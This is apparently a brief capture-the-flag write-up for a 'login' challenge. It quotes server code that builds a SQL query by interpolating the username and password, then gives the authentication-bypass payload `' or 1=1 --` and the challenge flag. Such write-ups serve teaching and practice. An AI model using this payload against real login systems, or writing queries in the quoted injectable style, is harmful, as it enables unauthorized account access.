# login

Source: [index.js](index.js)

```js
result = db
	.prepare(
		`SELECT * FROM users 
	WHERE username = '${username}'
	AND password = '${password}';`
	)
	.get();
```

The server creates a SQL query via string concatentation, meaning it is vulnerable to a classic SQL injection.

Final Exploit: `' or 1=1 --`

Flag: flag{0bl1g4t0ry_5ql1}
